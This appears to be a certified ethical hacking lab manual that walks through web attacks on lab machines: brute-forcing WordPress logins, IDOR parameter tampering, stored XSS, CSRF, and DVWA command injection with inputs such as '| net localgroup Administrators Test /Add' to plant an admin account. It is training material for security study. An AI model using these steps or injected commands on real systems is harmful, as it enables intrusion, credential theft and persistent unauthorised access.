Clickjacking, also known as a “UI redress attack,” occurs when an attacker uses multiple transparent or opaque layers to trick a user into clicking on a button or link on another page when they intend to click on the top-level page. Thus, the attacker is “hijacking” clicks meant for the top-level page and routing them to another page, most likely owned by another application, domain, or both.

Here, we will identify a clickjacking vulnerability using ClickjackPoc.

In this task, we will identify a clickjacking vulnerability in the target website (www.moviescope.com) hosted by the Windows Server 2019 machine, and we will use the Parrot Security machine as the host machine.

Click Parrot Security to switch to Parrot Security machine. Click the MATE Terminal icon at the top of the Desktop window to open a Terminal window.

Screenshot

A Parrot Terminal window appears. In the terminal window, type sudo su and press Enter to run the programs as a root user.

In the [sudo] password for attacker field, type toor as a password and press Enter.

The password that you type will not be visible.

Screenshot

Type cd ClickjackPoc/ and press Enter to navigate to the ClickjackPoc directory.

Screenshot

In the terminal window, type echo “http://www.moviescope.com” | tee domain.txt and press Enter.

This will create a file named domain.txt containing the website link.

Screenshot

Type python3 clickJackPoc.py -f domain.txt press Enter to start the scan.

-f: specifies the file which contains domain names.

The result appears, displaying that the target website is vulnerable to clickjacking as shown in screenshot.

Screenshot

Now, click Places from the top-section of the Desktop and click Home Folder from the drop-down options.

Screenshot

An attacker window appears, double click on ClickjackPoc directory.

Screenshot

In ClickjackPoc directory, right-click www.moviescope.com.html file and hover cursor over Open with and click Firefox from the list.

Screenshot

Clickjack Poc, web page appears in Firefox browser showing that the website is vulnerable to clickjacking, as shown in the screenshot.

Screenshot

This concludes the demonstration of identifying clickjacking vulnerability in the target website using ClickjackPoc.

Close all open windows and document all acquired information.

########
Lab 2 - Perform Web Application Attacks
########

========
Task 1: Perform a Brute-force Attack using Burp Suite
========

Here, we will perform a brute-force attack on the target website using Burp Suite.

In this task, the target WordPress website (http://10.10.1.22:8080/CEH) is hosted by the victim machine, Windows Server 2022. Here, the host machine is the Parrot Security machine.

Ensure that the Wampserver is running in Windows Server 2022 machine. To run the WampServer, execute the following steps:

Click Windows Server 2022 to switch to the Windows Server 2022 machine Click Ctrl+Alt+Delete to activate the machine, by default, CEH\Administrator account is selected, type Pa$$w0rd in the Password field and press Enter.
Now, in the left corner of Desktop, click Type here to search field, type wampserver64 and press Enter to select Wampserver64 from the results.
Click the Show hidden icons icon, observe that the WampServer icon appears.
Wait for this icon to turn green, which indicates that the WampServer is successfully running.
Click Parrot Security to switch to the Parrot Security machine.

Click the Firefox icon from the top section of Desktop to launch the Mozilla Firefox browser.

Screenshot

The Mozilla Firefox window appears; type http://10.10.1.22:8080/CEH/wp-login.php? Into the address bar and press Enter.

Here, we will perform a brute-force attack on the designated WordPress website hosted by the Windows Server 2022 machine.

Screenshot

Now, we shall set up a Burp Suite proxy by first configuring the proxy settings of the browser.

In the Mozilla Firefox browser, click the Open menu icon in the right corner of the menu bar and select Preferences from the list.

Screenshot

The General settings tab appears. In the Find in Preferences search bar, type proxy, and press Enter.

The Search Results appear. Click the Settings button under the Network Settings option.

Screenshot

The Connection Settings window appears; select the Manual proxy configuration radio button and specify the HTTP Proxy as 127.0.0.1 and the Port as 8080. Tick the Also use this proxy for FTP and HTTPS checkbox and click OK. Close the Preferences tab and minimize the browser window.

Screenshot

Now, minimize the browser window, click the Applications menu form the top left corner of Desktop, and navigate to Pentesting --> Web Application Analysis --> Web Application Proxies --> burpsuite to launch the Burp Suite application.

Screenshot

If a security pop-up appears, enter the password as toor in the Password field and click OK.

In the next Burp Suite Community Edition notification, click OK.

Screenshot

In the Terms and Conditions wizard, click the I Accept button.

Screenshot

If Delete old temporary files? pop-up appears, click Delete.

The Burp Suite main window appears; ensure that the Temporary project radio button is selected and click the Next button, as shown in the screenshot.

If an update window appears, click Close.

Screenshot

In the next window, select the Use Burp defaults radio-button and click the Start Burp button.

Screenshot

The Burp Suite main window appears; click the Proxy tab from the available options in the top section of the window.

Screenshot

In the Proxy settings, by default, the Intercept tab opens-up. Observe that by default, the interception is active as the button says Intercept is on. Leave it running.

Turn the interception on if it is off.

Screenshot

Switch back to the browser window. On the login page of the target WordPress website, type random credentials, here admin and password. Click the Log In button.

You can enter the credentials of your choice here.

Screenshot

Switch back to the Burp Suite window; observe that the HTTP request was intercepted by the application.

Now, right-click anywhere on the HTTP request window, and from the context menu, click Send to Intruder.

Observe that Burp Suite intercepted the entered login credentials.

If you do not get the request as shown in the screenshot, then press the Forward button.

Screenshot

Now, click on the Intruder tab from the toolbar and observe that under the Intruder tab, the Target tab appears by default.

Observe the target host and port values in the Host and Port fields.

Screenshot

Click on the Positions tab under the Intruder tab and observe that Burp Suite sets the target positions by default, as shown in the HTTP request. Click the Clear § button from the right-pane to clear the default payload values.

Screenshot

Once you clear the default payload values, select Cluster bomb from the Attack type drop-down list.

Cluster bomb uses multiple payload sets. There is a different payload set for each defined position (up to a maximum of 20). The attack iterates through each payload set in turn so that all permutations of payload combinations are tested. For example, if there are two payload positions, the attack will place the first payload from payload set 2 into position 2 and iterate through all payloads in payload set 1 in position 1; it will then place the second payload from payload set 2 into position 2 and iterate through all the payloads in payload set 1 in position 1.

more...
Screenshot

Now, we will set the username and password as the payload values. To do so, select the username value entered in Step 16 and click Add § from the right-pane.

Similarly, select the password value entered in Step 16 and click Add § from the right-pane.

Here, the username and password are admin and password.

Screenshot

Once the username and password payloads are added. The symbol ‘§’ will be added at the start and end of the selected payload values. Here, as the screenshot shows, the values are admin and password.

Screenshot

Navigate to the Payloads tab under the Intruder tab and ensure that under the Payload Sets section, the Payload set is selected as 1, and the Payload type is selected as Simple list.

Under the Payload Options [Simple list] section, click the Load… button.

Screenshot

A file selection window appears; navigate to the location /home/attacker/Desktop/CEHv12 Module 14 Hacking Web Applications/Wordlist, select the username.txt file, and click the Open button.

Screenshot

Observe that the selected username.txt file content appears under the Payload Options [Simple list] section, as shown in the screenshot.

Screenshot

Similarly, load a password file for the payload set 2. To do so, under the Payload Sets section, select the Payload set as 2 from the drop-down options and ensure that the Payload type is selected as Simple list.

Under the Payload Options [Simple list] section, click the Load… button.

Screenshot

A file selection window appears; navigate to the location /home/attacker/Desktop/CEHv12 Module 14 Hacking Web Applications/Wordlist, select the password.txt file, and click the Open button.

Screenshot

Observe that selected password.txt file content appears under the Payload Options [Simple list] section, as shown in the screenshot.

Screenshot

Once the wordlist files are selected as payload values, click the Start attack button to launch the attack.

Screenshot

A Burp Intruder notification appears. Click OK to proceed.

Screenshot

The Intruder attack of 10.10.1.22 window appears as the brute-attack initializes. It displays various username-password combinations along with the Length of the response and the Status.

Wait for the progress bar at the bottom of the window to complete.

Screenshot

After the progress bar completes, scroll down and observe the different values of Status and Length. Here, Status=302 and Length= 1134.

Different values of Status and Length indicate that the combination of the respective credentials is successful.

The values might differ when you perform this task.

In the Raw tab under the Request tab, the HTTP request with a set of the correct credentials is displayed. (here, username=admin and password=qwerty@123), as shown in the screenshot. Note down these user credentials.

Screenshot

Now, that you have obtained the correct user credentials, close the Intruder attack of 10.10.1.22 window.

If a Warning pop-up appears, click Discard.

Navigate back to the Proxy tab and click the Intercept is on button to turn off the interception. The Intercept is on button toggles to Intercept is off, indicating that the interception is off.

Screenshot

Switch to the browser window and perform Steps 5-7. Remove the browser proxy set up in Step 8, by selecting the No proxy radio-button in the Connection Settings window and click OK. Close the tab.

Screenshot

Reload the target website http://10.10.1.22:8080/CEH/wp-login.php?, enter the Username and Password obtained in Step 39 and click Log In.

Here, the username and password are admin and qwerty@123.

If a pop-up appears, click Resend.

You are successfully logged in using the brute-forced credentials. The Welcome to WordPress! Page appears, as shown in the screenshot.

Screenshot

This concludes the demonstration of how to perform a brute-force attack using Burp Suite.

Close all open windows and document all acquired information.

========
Task 2: Perform Parameter Tampering using Burp Suite
========

Here, we will use the Burp Suite tool to perform parameter tampering.

In this task, the target website (www.moviescope.com) is hosted by the victim machine, Windows Server 2019. Here, the host machine is the Parrot Security machine.

In Parrot Security machine click the Firefox icon from the top section of Desktop to launch the Mozilla Firefox browser.

Screenshot

The Mozilla Firefox window appears; type http://www.moviescope.com Into the address bar and press Enter.

Screenshot

Now, set up a Burp Suite proxy by first configuring the proxy settings of the browser.

In the Mozilla Firefox browser, click the Open menu icon in the right corner of the menu bar and select Preferences from the list.

Screenshot

The General settings tab appears. In the Find in Preferences search bar, type proxy, and press Enter.

The Search Results appear. Click the Settings button under the Network Settings option.

Screenshot

A Connection Settings window appears. Select the Manual proxy configuration radio button and click OK. Close the Preferences tab.

Screenshot

Now, minimize the browser window, click the Applications menu form the top left corner of Desktop, and navigate to Pentesting --> Web Application Analysis --> Web Application Proxies --> burpsuite to launch the Burp Suite application.

Screenshot

If a security pop-up appears, enter the password as toor in the Password field and click OK.

In the next Burp Suite Community Edition notification, click OK.

Screenshot

Burp Suite initializes. If a Burp Suite Community Edition notification saying An update is available appears, click Close.

The Burp Suite main window appears; ensure that the Temporary project radio button is selected and click the Next button, as shown in the screenshot.

If an update window appears, click Close.

Screenshot

In the next window, select the Use Burp defaults radio-button and click the Start Burp button.

Screenshot

The Burp Suite main window appears; click the Proxy tab from the available options in the top section of the window.

Screenshot

In the Proxy settings, by default, the Intercept tab opens-up. Observe that by default, the interception is active as the button says Intercept is on. Leave it running.

Turn the interception on if it is off.

Screenshot

Switch back to the browser window, and on the login page of the target website (www.moviescope.com), enter the credentials sam and test. Click the Login button.

Here, we are logging in as a registered user on the website.

Screenshot

Switch back to the Burp Suite window and observe that the HTTP request was intercepted by the application.

You can observe that the entered login credentials were intercepted by the Burp Suite.

Now, keep clicking the Forward button until you are logged into the user account.

Screenshot

Switch to the browser, and observe that you are now logged into the user account, as shown in the screenshot.

Now, click the View Profile tab from the menu bar to view the user information.

Screenshot

After clicking the View Profile tab, switch back to the Burp Suite window and keep clicking the Forward button until you get the HTTP request, as shown in the screenshot.

Now, click Expand icon present in the right-corner of the window in the INSPECTOR section.

Screenshot

Inspector wizard appears, click to expand Query Parameters.

Screenshot

You can observe NAME and VALUE columns, double click on the value, or click arrow icon (>).

Screenshot

In the next wizard, change the VALUE from 1 to 2 and click Apply Changes button.

Screenshot

In the Raw tab, click the Intercept is on button to turn off the interception.

Screenshot

After switching off the interception, navigate back to the browser window and observe that the user account associated with ID=2 appears with the name John, as shown in the screenshot.

Although we logged in using sam as a username with ID=1, using Burp Suite, we successfully tampered with the ID parameter to obtain information about other user accounts.

Screenshot

Similarly, you can edit the id parameter in Burp Suite with any random numeric value to view information about other user accounts.

Switch to the browser window and perform Steps 4-6. Remove the browser proxy set up in Step 7, by selecting the No proxy radio-button in the Connection Settings window and click OK. Close the tab.

Screenshot

This concludes the demonstration of how to perform parameter tampering using Burp Suite.

Close all open windows and document all acquired information.

========
Task 3: Identify XSS Vulnerabilities in Web Applications using PwnXSS
========

PwnXSS is an open-source XSS scanner that is used to detect cross-site scripting (XSS) vulnerabilities in websites. It is a multiprocessing and customizable tool written in Python language.

Here, we will use the PwnXSS tool to scan the target website for cross-site scripting (XSS) vulnerability.

In the Parrot Security machine, click the MATE Terminal icon at the top of the Desktop window to open a Terminal window.

Screenshot

A Parrot Terminal window appears. In the terminal window, type sudo su and press Enter to run the programs as a root user.

In the [sudo] password for attacker field, type toor as a password and press Enter.

The password that you type will not be visible.

Screenshot

Type cd PwnXSS and press Enter to enter into PwnXSS directory.

Screenshot

To perform scan on target website, type python3 pwnxss.py -u http://testphp.vulnweb.com and press Enter.

-u: specifies the target url (here, http://testphp.vulnweb.com). However, you can select a target URL of your choice.

Screenshot

The PwnXSS tool starts scanning and displays the identified vulnerable website links, as shown in the screenshot.

Screenshot

Copy any Query (GET) link under Detected XSS section from the terminal window.

Screenshot

Click the Firefox icon at the top of the Desktop window to open Firefox browser.

In the address bar of the Firefox browser, paste the copied link and press Enter.

Screenshot

If a pop-up appears, click OK to close it.

This concludes the demonstration of how to identify XSS vulnerabilities in web application using PwnXSS

Close all open windows and document all acquired information.

========
Task 4: Exploit Parameter Tampering and XSS Vulnerabilities in Web Applications
========

Here, we will learn how to exploit parameter tampering and XSS vulnerabilities in the target web application.

In this task, the target website (www.moviescope.com) is hosted by the victim machine Windows Server 2019. Here, the host machine is the Windows 11 machine.

Click Windows 11 to switch to the Windows 11 machine.

Launch any browser, here, Mozilla Firefox. In the address bar of the browser place your mouse cursor, type http://www.moviescope.com and press Enter.

Screenshot

The MovieScope website appears. In the Login form, type Username and Password as steve and password, and click Login.

Here, we are logging in as a registered user on the website.

Screenshot

You are logged into the website. Click the View Profile tab from the menu bar.

Screenshot

You will be redirected to the profile page, which displays the personal information of steve (here, you). You will observe that the value of ID in the personal information and address bar is 4.

Screenshot

Now, try to change the parameter in the address bar to id=1 and press Enter.

Screenshot

You will be redirected to the profile of sam without having to perform any hacking techniques to explore the database. Here, you can observe Sam’s personal information under the View Profile tab, as shown in the screenshot.

Screenshot

Now, try the parameter id=3 in the address bar and press Enter.

You get the profile for kety. This way, you can change the id number and obtain profile information for different users.

This process of changing the ID value and getting the result is known as parameter tampering. Web XSS attacks exploit vulnerabilities on dynamically generated web pages. This enables malicious attackers to inject client-side scripts into the web pages viewed by other users.

Screenshot

Now, click the Contacts tab. Here you will be performing an XSS attack.

Screenshot

The Contacts page appears; enter your name or any random name (here, steve) in the Name field; enter the cross-site script as shown in the screenshot in the Comment field and click the Submit Comment button.

Screenshot

On this page, you are testing for XSS vulnerability. Now, refresh the Contacts page.

If a notification appears saying To display this page, Firefox must send information…, click the Resend button.

Screenshot

You have successfully added a malicious script to this page. The comment with the malicious link is stored on the server.

Click Windows Server 2019 to switch to the Windows Server 2019 machine. Click Ctrl+Alt+Delete to activate the machine, by default, Administrator account is selected, type Pa$$w0rd in the Password fieldand press Enter.

Screenshot

Launch any browser, in this lab we are using Google Chrome. In the address bar of the browser place your mouse cursor and type http://www.moviescope.com and press Enter.

The MovieScope website appears. In the Login form, type the Username and Password as sam and test and click Login.

Here, we are logging in as the victim.

Screenshot

You are logged into the website as a legitimate user. Click the Contacts tab from the menu bar.

Screenshot

As soon as you click the Contacts tab, the cross-site script running on the backend server is executed, and a pop-up appears, stating, You are Hacked.

Screenshot

Similarly, whenever a user attempts to visit the Contacts page, the alert pops up as soon as the page is loaded.

This concludes the demonstration of how to exploit parameter tampering and XSS vulnerabilities in web applications.

Close all open windows and document all acquired information.

========
Task 5: Perform Cross-site Request Forgery (CSRF) Attack
========

CSRF, also known as a one-click attack, occurs when a hacker instructs a user’s web browser to send a request to the vulnerable website through a malicious web page. Financial websites commonly contain CSRF vulnerabilities. Usually, outside attackers cannot access corporate intranets, so CSRF is one of the methods used to enter these networks. The inability of web applications to differentiate a request made using malicious code from a genuine request exposes it to the CSRF attack. These attacks exploit web page vulnerabilities that allow an attacker to force an unsuspecting user’s browser to send malicious requests that they did not intend.

CSRF attacks can be performed using various techniques and tools. Here, we will perform a CSRF attack using WPScan.

In this task, the target WordPress website (http://10.10.1.22:8080/CEH) is hosted by the victim machine Windows Server 2022. Here, the host machine is the Parrot Security machine.

Click Windows Server 2022 to switch to the Windows Server 2022 machine.

Screenshot

Click Ctrl+Alt+Delete to activate the machine, by default, CEH\Administrator account is selected, type Pa$$w0rd in the Password field and press Enter.

Screenshot

In Type here to search field of the Desktop, type wampserver and click on Wampserver64 to start Wampserver.

Screenshot

Now, in the right corner of Desktop, click the Show hidden icons icon, observe that the WampServer icon appears.

Wait for this icon to turn green, which indicates that the WampServer is successfully running.

Screenshot

Now, open any web browser (here, Mozilla Firefox). In the address bar place your mouse cursor, type http://10.10.1.22:8080/CEH/wp-login.php? and press Enter.

Here, we are opening the above-mentioned website as the victim.

A WordPress webpage appears. Type Username or Email Address and Password as admin and qwerty@123. Click the Log In button.

Screenshot

Assume that you have installed and configured the Firewall plugin for this site and that you want to check the security configurations.

Hover your mouse cursor on Plugins in the left pane and click Installed Plugins, as shown in the screenshot.

Screenshot

In the Plugins page, observe that leenk.me is installed. Click Activate under the leenk.me plugin to activate the plugin.

2gmzq0nt.jpg

Refresh the page and you will observe that the leenk.me plugin option appears in the left pane; click it.

Refresh the page if leenk.me does not appear on the left pane.

The leenk.me General Settings page appears. Tick the Facebook checkbox in the Choose which social network modules you want to enable for this site option under the Administrator Options section and click the Save Settings button.

Screenshot

The leenk.me General Settings page appears, as shown in the screenshot. Ensure that under the Administrator Options section, the Facebook checkbox is selected in the Choose which social network modules you want to enable for this site option and click the Facebook Settings hyperlink.

Screenshot

A Facebook Settings page appears; under Message Settings, enter the details below:

Default Message: This is CEH lab.
Default Link Name: CEH.com
Default Caption: CEH Labs
Clear the Default Description text field. Leave the other settings to default and click the Save Settings button to save the settings.

Screenshot

Click Parrot Security to switch to the Parrot Security machine.

Click the Firefox icon from the top section of Desktop to open Firefox browser.

Screenshot

The Firefox window appears. Type https://wpscan.com/register into the address bar and press Enter.

A webpage with a Register new user form appears; scroll down and in the Required fields enter your personal details. Check I agree to the terms of service checkbox..

cjjzzu2b.jpg

Now, scroll down to the end of the page, click I'm not a robot and click on Register button.

If Would you like Firefox to save this login notification appears at the top of the browser window, click Don’t Save.

If a captcha window appears, verify it.

Screenshot

A notification saying A message with a confirmation link has been sent to your email address….

Now, open a new tab in the Firefox browser and open the email account you gave while registering as a new user in Step 19.

Once you are logged into your email account, open the email from noreply@wpscan.com, and in the email, click the Confirm my account hyperlink.

If you get any error while accessing website content in Parrot Security machine, then browse the same website in your local machine, login into your account and perform the following steps.

If you are unable to confirm the account then right-click the link and click on Open Link in New Tab.

! dc4bcdqe.jpg

A new webpage appears with a message saying Your email address has been successfully confirmed. Enter the same details in the Email Address and Password fields that you provided in Step 19.

If a Would you like Firefox to save this login notification appears at the top of the browser window, click Don’t Save.

1lf0pkahe.jpg

You get signed in successfully in the website. Now, click the How it works button from the menu bar and click Get started for free button.

Screenshot

The Edit Profile page appears; in the API Token section and observe the API Token. Note down or copy this API Token; we will use this token in the later steps.

0druabw3.jpg

Close the Firefox browser window.

Click the MATE Terminal icon at the top of the Desktop window to open a Terminal window.

Screenshot

A Parrot Terminal window appears. In the terminal window, type sudo su and press Enter to run the programs as a root user.

In the [sudo] password for attacker field, type toor as a password and press Enter.

The password that you type will not be visible.

Now, type cd and press Enter to jump to the root directory.

Screenshot

In the Terminal window, type wpscan --api-token [API Token from Step#26] --url http://10.10.1.22:8080/CEH --plugins-detection aggressive --enumerate vp and press Enter.

--enumerate vp: specifies the enumeration of vulnerable plugins.

hou4gz02.jpg

The result appears, displaying detailed information regarding the target website.

bmxqkwkq.jpg

Scroll down to the Plugin(s) Identified section, and observe the installed vulnerable plugins (akismet and leenkme) on the target website.

In this task, we will exploit the CSRF vulnerability present in the leenkme plugin.

Screenshot

Minimize the Terminal window. Click the Places menu at the top of Desktop and click Desktop from the drop-down options.

Screenshot

The Desktop window appears, copy Security_Script.html file.

Screenshot

Click the Places menu at the top of Desktop and click Network from the drop-down options.

Screenshot

The Network window appears; press the Ctrl+L keys. A Location field appears; type smb://10.10.1.11 and press Enter to access the Windows 11 shared folders.

Screenshot

A security pop-up appears; enter the Windows 11 machine credentials (Username: Admin and Password: Pa$$w0rd) and click Connect.

Screenshot

The Windows shares on 10.10.1.11 window appears; double-click the CEH-Tools folder.

Screenshot

Navigate to CEHv12 Module 14 Hacking Web Applications and paste Security_Script.html script.

Screenshot

Click Windows Server 2022 to switch to the Windows Server 2022 machine Click Ctrl+Alt+Delete to activate the machine, by default, CEH\Administrator account is selected, type Pa$$w0rd in the Password field and press Enter.

Screenshot

Navigate to the location Z:\CEHv12 Module 14 Hacking Web Applications (shared network drive), copy the Security_Script.html file, and paste it onto Desktop.

Screenshot

Right-click the Security_Script.html file and navigate to Open with --> Firefox.

You should use the same browser that was used in Step 6.

Screenshot

The Security_Script.html file opens up in the Mozilla Firefox browser, along with a pop-up; click OK to continue.

Screenshot

You will be redirected to the Facebook Settings page of the leenk.me plugin page. Observe that the field values have been changed, indicating a successful CSRF attack on the website, as shown in the screenshot.

Screenshot

This concludes the demonstration of how to perform a CSRF attack on a target website.

Close all open windows on both the machines (Window Server 2022 and Parrot Security) and document all acquired information.

========
Task 6: Enumerate and Hack a Web Application using WPScan and Metasploit
========

In this task, we will perform multiple attacks on a vulnerable PHP website (WordPress) in an attempt to gain sensitive information such as usernames and passwords. You will also learn how to use the WPScan tool to enumerate usernames on a WordPress website, and how to crack passwords by performing a dictionary attack using an msf auxiliary module.

Ensure that the Wampserver is running in Windows Server 2022. To launch Wampserver:

Click Windows Server 2022 to switch to the Windows Server 2022 machine Click Ctrl+Alt+Delete to activate the machine, by default, CEH\Administrator account is selected, type Pa$$w0rd in the Password field and press Enter.
Now, in the left corner of Desktop, click Type here to search field, type wampserver64 and press Enter to select Wampserver64 from the results.
Click the Show hidden icons icon, observe that the WampServer icon appears.
Wait for this icon to turn green, which indicates that the WampServer is successfully running.
Click Parrot Security to switch to the Parrot Security machine.

Click the MATE Terminal icon at the top of the Desktop window to open a Terminal window.

Screenshot

A Parrot Terminal window appears. In the terminal window, type sudo su and press Enter to run the programs as a root user.

If a Question pop-up window appears, asking for you to update the machine, click No to close the window.

In the [sudo] password for attacker field, type toor as a password and press Enter.

The password that you type will not be visible.

Now, type cd and press Enter to jump to the root directory.

Screenshot

In the Terminal window, type wpscan --api-token [API Token] --url http://10.10.1.22:8080/CEH --enumerate u and press Enter.

--enumerate u: specifies the enumeration of usernames.

Here, we will use the API token that we obtained by registering with the https://wpscan.com/register website.

4lktn14x.jpg

WPScan begins to enumerate the usernames stored in the website’s database. The result appears, displaying detailed information from the target website.

Scroll down to the User(s) Identified section and observe the information regarding the available user accounts.

Screenshot

Now that you have successfully obtained the usernames stored in the database, you need to find their passwords.

To obtain the passwords, you will use the auxiliary module called wordpress_login_enum (in msfconsole) to perform a dictionary attack using the password.txt file (in the Wordlist folder) which you copied to the location /home/attacker/Desktop/CEHv12 Module 14 Hacking Web Applications.

To use the wordpress_login_enum auxiliary module, you need to first launch msfconsole. However, before this, you need to start the PostgreSQL service.

In the terminal window, type service postgresql start and press Enter to start the PostgreSQL service.

Screenshot

Type msfconsole and press Enter to launch the Metasploit framework.

In msfconsole, type use auxiliary/scanner/http/wordpress_login_enum and press Enter.

Screenshot

This module allows you to enumerate the login credentials.

To know all options available to configure in this Metasploit module, type show options, and press Enter.

This provides a list of options that can be set for this module. As we must obtain the password for the target user account, we will set the below options:

PASS_FILE: Sets the password.txt file, using which; you will perform the dictionary attack
RHOST: Sets the target machine (here, the Windows Server 2022 IP address)
RPORT: Sets the target machine port (here, the Windows Server 2022 port)
TARGETURI: Sets the base path to the WordPress website (here, http://[IP Address of Windows Server 2022]:8080/CEH]
USERNAME: Sets the username that was obtained in Step 8. (here, admin)
Screenshot

Now, in the msfconsole, type the below commands:

Type set PASS_FILE /home/attacker/Desktop/CEHv12 Module 14 Hacking Web Applications/Wordlist/password.txt and press Enter to set the file containing the passwords. (here, we are using the password.txt password file).
Type set RHOSTS [IP Address of Windows Server 2022] (here, 10.10.1.22) and press Enter to set the target IP address. (Here, the IP address of Windows Server 2022 is 10.10.1.22).
Type set RPORT 8080 and press Enter to set the target port.
Type set TARGETURI http://[IP Address of Windows Server 2022]:8080/CEH and press Enter to set the base path to the WordPress website (Here, the IP address of Windows Server 2022 is 10.10.1.22).
Type set USERNAME admin and press Enter to set the username as admin.
You may issue any one of the usernames that you have obtained during the enumeration process in Step 8. In this task, the admin user is being issued.

Screenshot

All the options have successfully been set. Type run and press Enter to execute the auxiliary module.

Screenshot

Observe that the auxiliary module initially enumerates details such as the ID number and the stored location of the username admin, and then begins to brute-force the login credentials by trying various passwords for the given username.

Screenshot

The auxiliary module tests various passwords against the given username (admin) and the cracked password is displayed, as shown in the screenshot.

Here, the cracked password is qwerty@123, which might differ in your lab environment.

Screenshot

Now, use the obtained username-password combination to log into the WordPress website. (Here, Username: admin and Password: qwerty@123).

Now, click the Firefox icon from the top section of Desktop to launch the Mozilla Firefox browser.

In the address field, type http://[IP Address of Windows Server 2022]:8080/CEH/wp-login.php in the address bar and click the Log In button.

If a Would you like Firefox to save this login notification appears at the top of the browser window, click Don’t Save.

Screenshot

Observe that you are successfully logged into the target WordPress website (http://10.10.1.22:8080/CEH) and that you can see the website content.

Screenshot

Similarly, you can crack the passwords of other users by firstly selecting a particular username from Step 8, and then perform Steps 12-21.

This concludes the demonstration of how to enumerate and hack a web application using WPScan and Metasploit.

Close all open windows on both the machines (Windows Server 2022 and Parrot Security) and document all acquired information.

========
Task 7: Exploit a Remote Command Execution Vulnerability to Compromise a Target Web Server
========

In this task, we will perform command-line execution on a vulnerability found in DVWA. Here, you will learn how to extract information about a target machine, create a user account, assign administrative privileges to the created account, and use that account to log in to the target machine.

Click Windows 11 to switch to the Windows 11 machine.

Launch any browser, here, we are using Mozilla Firefox. In the address bar of the browser place your mouse cursor, type http://10.10.1.22:8080/dvwa/login.php and press Enter

The DVWA login page appears; type the Username and Password as gordonb and abc123. Click the Login button.

If a Would you like Firefox to save this login notification appears at the top of the browser window, click Don’t Save.

Screenshot

You are successfully logged in, and the DVWA main webpage appears. Click Command Injection from the options available in the left pane.

Screenshot

The Vulnerability: Command Injection page appears; under the Ping a device section, type the IP address of the Windows Server 2022 machine (here, 10.10.1.22) into the Enter an IP address field and click the Submit button to ping the machine.

The command injection utility in DVWA allows you to ping the target machine.

Screenshot

DVWA successfully pings the target machine, as shown in the screenshot.

Screenshot

Now, try to issue a different command to check whether DVWA can execute it.

Type | hostname into the Enter an IP address field and click Submit. This command is used to probe the hostname of the target machine.

Screenshot

As you have issued a command instead of entering the IP address of a machine, the application returns an error, as shown in the screenshot.

Screenshot

The result indicates that the DVWA application is secure.

Now, check the security setting of the web application. To do so, click DVWA Security in the left pane.

The DVWA Security page appears. Observe that the security level is Impossible. This security setting was blocking you from executing commands other than simply pinging a machine.

Now, to exploit the command execution vulnerability, set the Security Level of the web application to low by selecting the option Low from the drop-down list and click Submit.

Here, your intention would be to show that a weakly secured web application is the prime focus of attackers, who seek to exploit its vulnerabilities.

Screenshot

You have configured a weak security setting in DVWA. Now, try to execute a command other than ping.

Click Command Injection from the left-pane.

The Vulnerability: Command Injection page appears; type | hostname into the Enter an IP address field, and click Submit.

DVWA returns the name of the Windows Server 2022 machine, as shown in the screenshot.

Screenshot

This infers that the command execution field is vulnerable and that you can remotely execute commands.

Now, extract more information regarding the target machine, Windows Server 2022.

Type the command | whoami and click Submit.

Screenshot

The application displays the user, group, and privileges information for the user currently logged onto the Windows Server 2022 machine, as shown in the screenshot.

Screenshot

Now, type | tasklist, and click Submit to view the processes running on the machine.

Screenshot

A list of all the running processes on the Windows Server 2022 machine is displayed, as shown in the screenshot.

Screenshot

To check if you can terminate a process, choose any process from the list (here, Microsoft.ActiveDirectory), and note down its process PID (here, 3112).

The list of running processes might differ in your lab environment.

Screenshot

Type | Taskkill /PID [Process ID value of the desired process] /F (here, PID is 3112) and click Submit. By issuing this command, you are forcefully (/F) terminating the process.

Screenshot

The process will be successfully terminated, as shown in the screenshot.

To confirm that the process has successfully been terminated, you can issue the | tasklist command again to check the running processes.

Screenshot

Now, to view the directory structure of the Windows Server 2022 machine, type | dir C:\ and click Submit to view the files and directories on the C:\ drive.

Screenshot

The directory structure of the C drive of the target server (Windows Server 2022) is displayed, as shown in the screenshot.

Screenshot

In the same way, you can issue commands to view other directories.

Now, try to obtain information related to user accounts.

To view user account information, type | net user, and click Submit.

Screenshot

DVWA obtains user account information from the Windows Server 2022 machine and lists, as shown in the screenshot.

Screenshot

Now, use the command execution vulnerability and attempt to add a user account remotely.

Create an account named Test. To do so, type | net user Test /Add and click Submit.

Screenshot

The command completed successfully notification appears and a user account named Test is created.

Screenshot

To view the new user account, type the command | net user and click Submit.

You can observe the newly created account Test, as shown in the screenshot.

Screenshot

Now, view the new account’s information. Type | net user Test and click Submit.

Screenshot

The Test account information appears. You can see that Test is a standard user account and does not have administrative privileges. You can see that it has an entry called Local Group Memberships.

Screenshot

Now, assign administrative privileges to the account. The reason for granting administrative privileges to this account is to use this (admin) account to log into the Windows Server 2022 machine with administrator access using a remote desktop connection.

To grant administrative privileges, type | net localgroup Administrators Test /Add and click Submit.

Screenshot

You have successfully granted admin privileges to the account. Confirm the new setting by issuing the command | net user Test. Test is now an administrator account under the Local Group Memberships option.

Screenshot

Now, log into the Windows Server 2022 machine using the Test account through Remote Desktop Connection.

Click Search icon ( search8icon.jpg) on the Desktop. Type remote in the search field, the Remote Desktop Connection appears in the results, click Open to launch it.

The Remote Desktop Connection window appears. In the Computer field, type the target system IP address (here, 10.10.1.22 [Windows Server 2022]) and click Show Options.

Screenshot

The Remote Desktop Connection window appears with the General tab displayed; enter the User name as test and click Connect.

Screenshot

A Windows Security pop-up appears; leave the Password field empty and click OK.

Screenshot

A Remote Desktop Connection window appears; click Yes.

Screenshot

A remote desktop connection is successfully established, as shown in the screenshot.

Thus, you have made use of a command execution vulnerability in a DVWA application hosted by the Windows Server 2022 machine, extracted information related to the machine, remotely created an administrator account, and logged into it.

If a Server Manager window appears close it.

Screenshot

Now, you may discontinue the session and log out of the web application. To do so, close the Remote Desktop Connection window. If a Your remote session will be disconnected notification appears, click OK.

This concludes the demonstration of how to exploit a remote command execution vulnerability to compromise a target web server.

Close all open windows and document all acquired information.

========
Task 8: Exploit a File Upload Vulnerability at Different Security Levels
========

Here, we will use exploit a file upload vulnerability at different security levels of DVWA using Metasploit.

Before starting this task, ensure that the WampServer is running on the Windows Server 2022 machine.

Click Parrot Security to switch to the Parrot Security machine.

Click the MATE Terminal icon at the top of Desktop to open a Terminal window.

Screenshot

A Parrot Terminal window appears. In the terminal window, type sudo su and press Enter to run the programs as a root user.

In the [sudo] password for attacker field, type toor as a password and press Enter.

The password that you type will not be visible.

Now, type cd and press Enter to jump to the root directory.

Screenshot

